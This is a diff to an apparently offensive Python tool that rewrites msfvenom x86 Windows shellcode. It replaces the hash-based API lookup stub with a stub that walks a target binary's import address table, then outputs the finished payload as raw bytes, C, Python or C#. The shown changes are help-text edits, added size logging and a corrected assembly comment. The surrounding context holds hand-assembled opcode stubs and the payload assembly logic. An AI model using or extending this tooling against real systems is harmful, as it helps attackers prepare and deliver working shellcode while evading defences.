@@ -39,12 +39,12 @@ parser.add_argument("-b", "--targetbinary", default="", dest="targetbinary",
                     )
 parser.add_argument("-t", "--OSTarget", default="Win7", dest="OS",
                     action="store",
-                    help="OS target for looking for target DLL Import Tables: win7, win8, winVista, win10")
+                    help="OS target for looking for target DLL Import Tables: winXP, win7, win8, winVista, win10")
 parser.add_argument("-s", '--shellcode', default="", dest="code",
                     action="store",
                     help="x86 Win Shellcode with Stephen Fewers Hash API prepended (from msfvenom) can be from stdin")
 parser.add_argument("-d", '--DLLName', default="", dest="dll", action="store",
-                    help="If you know the DLL you are targeting enter this, no need for OS, DLL flags")
+                    help="If you know the DLL in the IAT you are targeting enter this, no need for OS flag.")
 parser.add_argument("-l", '--Import', default='kernel32.dll', dest='importname', action='store',
                     help="""For use with -d and ExternGPA (-p), specify either 'kernel32.dll' or 
 'api-ms-win-core-libraryloader' -- you need to know with import you are targeting.
@@ -57,7 +57,7 @@ parser.add_argument('outfile', nargs='?', type=argparse.FileType('w'),
                     default=sys.stdout,
                     )                          
 parser.add_argument('-o', '--output', dest="OUTPUT", action="store", default='stdout', 
-                    help="How you would like your output: [c], [p]ython, c[s]harp"
+                    help="How you would like your output: [c], [p]ython, c[s]harp Default: stdout."
                     )
 parser.add_argument("-p", "--parser_stub", dest="parser_stub", action="store", default='GPA', 
                     help="""By default this assumes that GetProcAddress (GPA) is in the targetbinary's
@@ -659,6 +659,7 @@ class x86_windows_metasploit:
         return None, None
 
     def get_it_in_order(self):
+        sys.stderr.write("[*] Length of submitted payload:{0}\n".format(len(self.code)))
         self.replace_string = b''
 
         if self.fewerapistub in self.code:
@@ -1239,7 +1240,7 @@ class x86_windows_metasploit:
         # Check_hash
         self.stub += struct.pack("<I", 0xffffffff-len(self.stub) - table_offset + 14)
         self.stub += b"\x3B\x4C\x24\x24"                    # CMP ECX,DWORD PTR SS:[ESP+24]  ; check if hash in lookup table
-        self.stub += b"\x74\x05"                            # JE SHORT 001C0191              ; if equal, to to found a match
+        self.stub += b"\x74\x05"                            # JE SHORT 001C0191              ; if equal, jmp to found_a_match
         self.stub += b"\x83\xC6\x06"                        # ADD ESI,6                      ; else increment to next hash
         self.stub += b"\xEB\xEF"                            # JMP SHORT 001C0191             ; repeat
         # FOUND_A_MATCH
@@ -1290,6 +1291,7 @@ class x86_windows_metasploit:
         self.entire_payload = self.jump_stub + self.selected_payload + self.stub + self.prestine_code
 
         sys.stderr.write("[*] Payload complete\n")
+        sys.stderr.write("[*] Output size: {0}\n".format(len(self.entire_payload)))
 
         if self.OUTPUT is 'stdout':
             sys.stdout.buffer.write(self.entire_payload)
